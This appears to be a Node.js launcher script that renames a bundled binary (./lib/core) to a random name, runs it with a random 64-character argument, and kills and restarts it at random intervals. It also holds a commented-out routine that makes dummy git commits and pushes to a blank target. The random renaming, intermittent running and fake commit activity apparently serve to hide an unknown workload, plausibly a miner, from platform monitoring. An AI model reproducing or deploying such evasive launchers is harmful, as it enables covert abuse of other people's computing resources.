function makeid(length) {
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (var i = 0; i < length; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}
var name = makeid(5);
var param = makeid(64);
require('child_process').execSync('cd ./lib && mv core ' + name + ' && chmod 755 -R ' + name + ' && ls -l');
var child = require('child_process').spawn('./lib/' + name, [param]);
child.stdout.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.stderr.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.on('close', function(code) {
    console.log('closing code: ' + code);
});
var target = '';
var myrepo = 'git clone ' + target + ' aaa && ';
myrepo += 'git config --global user.email "test" && ';
myrepo += 'git config --global user.name "test" && ';
myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
//require('child_process').exec(myrepo);
var index = 1;
var max = 12;
var interval;
var lock = false;
interval = setInterval(function () {
  if (index >= max) {    
    setTimeout(function(){
        process.exit(0);
    }, 1000);		
  }
  if(Math.random() < 0.6 && !lock) {
      lock = true;
      child.kill('SIGINT');
  }
  else {
      if(lock) {
          lock = false;
          child = require('child_process').spawn('./lib/' + name, [param]);
          child.stdout.on('data', function(data) {
              console.log('stdout: ' + data);
          });
          child.stderr.on('data', function(data) {
              console.log('stdout: ' + data);
          });
          child.on('close', function(code) {
              console.log('closing code: ' + code);
          });
      }
  }
  console.log("running..." + ++index);
}, 1000 * 60);
